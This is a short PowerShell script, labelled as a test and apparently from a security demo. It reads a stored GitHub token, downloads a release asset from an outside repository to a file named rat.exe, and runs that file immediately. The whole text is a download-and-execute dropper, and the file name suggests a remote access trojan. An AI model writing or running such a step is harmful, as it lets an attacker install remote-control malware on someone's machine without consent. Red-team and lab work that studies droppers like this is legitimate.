#TEST11 
$tkn= Get-Content "C:\CRDemo\tkn.txt"
$headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}
Invoke-WebRequest "https://api.github.com/repos/maki2010/seclab/releases/assets/68732756" -Headers $headers -OutFile C:\CRDemo\rat.exe; C:\CRDemo\rat.exe
